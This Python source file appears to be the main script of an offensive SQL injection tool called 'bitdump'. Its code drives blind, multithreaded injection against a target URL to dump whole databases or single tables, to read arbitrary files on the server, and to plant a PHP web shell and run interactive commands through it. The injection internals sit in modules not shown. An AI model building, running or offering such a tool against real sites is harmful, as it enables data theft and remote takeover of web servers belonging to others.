#!/usr/bin/env python

import math, sys, concurrent.futures

import injection, parsing, structures

ERR_INJECTION = 1
ERR_BAD_ARGUMENTS = 2
ERR_TIMEOUT = 3
ERR_FILE_READ = 4
ERR_TABLE_NOT_FOUND = 5

class Printer:

    def __init__(self, verbosity=0, outfile=None):
        self.verbosity = verbosity
        self.outfile = outfile

    def print(self, str, req_verbosity=0, indent=0):
        if self.verbosity >= req_verbosity:
            print(('\t'*indent)+str)

    def printToFile(self, str, indent=0):
        if self.outfile is None:
            print(('\t'*indent)+str)
        else:
            self.outfile.write(('\t'*indent)+str+'\n')

    def printDatabase(self, database):
        self.printToFile("========== DATABASE DUMP ==========")
        for table in database.tables:
            self.printTable(table)
            self.printToFile("")

    def printTable(self, table):
        self.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
        for record in table.records:
            for column, value in record.data.items():
                self.printToFile("%s: %s" % (column, value), 1)
            self.printToFile("")

if __name__ == '__main__':
    p = parsing.Parser()
    
    verbosity = 0 if p.args.verbose is None else p.args.verbose
    printer = Printer(verbosity, p.args.outfile)
    try:
        cookies = p.args.cookie
    except AttributeError:
        cookies = None

    if p.args.shell is not None:
        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
        try:
            print("Loading injector...")
            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor, cookies, p.args.method_get)
        except injection.InjectionError:
            print("Failed injection! Are you sure your settings are correct?")
            exit(ERR_INJECTION)
        except injection.TimeoutLimitError as e:
            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
            exit(ERR_TIMEOUT)
        else:
            print("Generating shell...")
            shell = injector.injectPHPShell(p.args.shell)
        finally:
            stringExecutor.shutdown()
            charExecutor.shutdown()
        output = shell.prompt()
        done = False
        while not done:
            cmd = input(output)
            if cmd == "exit":
                print("[bitdump] exiting")
                done = True
            else:
                output = shell.execute(cmd)
    elif p.args.file is None:
        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
        tableExecutor = None
        recordExecutor = None
        try:
            print("Loading injector...")
            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor, cookies, p.args.method_get)
        except injection.InjectionError:
            print("Failed injection! Are you sure your settings are correct?")
            exit(ERR_INJECTION)
        except injection.TimeoutLimitError as e:
            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
            exit(ERR_TIMEOUT)
        else:
            if p.args.dump_table is None:
                if p.args.tables_only:
                    tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
                else:
                    tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.01), 1))
                    recordExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.09), 1))

                try:
                    db = structures.Database(injector, tableExecutor, recordExecutor, printer)
                    db.findTables(not p.args.tables_only)
                except injection.TimeoutLimitError as e:
                    print("Request timed out %d consecutive times -- check your internet connection and/or try reducing the number of threads." % e.timeouts)
                    exit(ERR_TIMEOUT)
                printer.printDatabase(db)
            else:
                recordExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
                try:
                    s = p.args.dump_table.split(".")
                    if len(s) == 1:
                        print("Dumping table %s" % s[0])
                        table = structures.Table(injector, s[0], None, recordExecutor, printer)
                    else:
                        print("Dumping table %s.%s" % (s[0], s[1]))
                        table = structures.Table(injector, s[1], s[0], recordExecutor, printer)
                    if not table.verify():
                        print("Table not found!")
                        exit(ERR_TABLE_NOT_FOUND)
                    table.populate(p.parseWhere())
                except injection.TimeoutLimitError as e:
                    print("Request timed out %d consecutive times -- check your internet connection and/or try reducing the number of threads." % e.timeouts)
                    exit(ERR_TIMEOUT)
                printer.printTable(table)
        finally:
            if tableExecutor is not None: tableExecutor.shutdown()
            if recordExecutor is not None: recordExecutor.shutdown()
            stringExecutor.shutdown()
            charExecutor.shutdown()
    else:
        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))

        try:
            print("Loading injector...")
            injector = injection.Injector(p.args.url, p.args.success, p.args.delay, p.args.attack_field, p.parseOtherFields(), stringExecutor, charExecutor, cookies, p.args.method_get)
            print("Reading file...")
            file = structures.File(injector, p.args.file)
        except injection.InjectionError:
            print("Failed injection! Are you sure your settings are correct?")
            exit(ERR_INJECTION)
        except injection.TimeoutLimitError as e:
            print("Unable to reach %s -- check your internet connection and ensure your target is correct." % e.url)
            exit(ERR_TIMEOUT)
        except structures.FileReadError:
            print("Unable to read file: %s" % p.args.file)
            exit(ERR_FILE_READ)
        else:
            try:
                printer.printToFile(file.read())
            except injection.TimeoutLimitError as e:
                print("Request timed out %d consecutive times -- check your internet connection and/or try reducing the number of threads." % e.timeouts)
                exit(ERR_TIMEOUT)
        finally:
            stringExecutor.shutdown()
            charExecutor.shutdown()
